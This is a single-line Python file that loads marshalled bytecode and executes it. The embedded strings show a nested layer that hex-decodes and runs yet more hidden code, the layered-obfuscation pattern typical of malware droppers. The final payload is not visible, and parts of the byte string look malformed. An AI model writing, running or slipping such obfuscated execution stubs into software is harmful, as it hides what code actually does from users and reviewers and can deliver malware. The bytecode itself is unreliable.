from marshal import loads as dzx;exec(dzx(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\xf3,\x00\x00\x00\x97\x00d\x00d\x01l\x00m\x01Z\x02\x01\x00\x02\x00e\x03\x02\x00e\x02d\x02\xab\x01\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00y\x03)\x04\xe9\x00\x00\x00\x00)\x01\xda\tb16decodes\x8a\x86\x13\)\x04\xda\x06base64r\x03\x00\x00\x00\xda\x03dzx\xda\x04exec\xa9\x00\xf3\x00\x00\x00\x00z\x08<capa_4>\xda\x08<module>r\t\x00\x00\x00\x01\x00\x00\x00s$\x00\x00\x00\xf0\x03\x01\x01\x01\xdd\x00#\xa1D\xa9\x13\xf0\x00\x00.{Zx\x04\xf3\x00\x00*|Zx\x04\xf5\x00\x00%}Zx\x04r\x08\x00\x00\x00'))
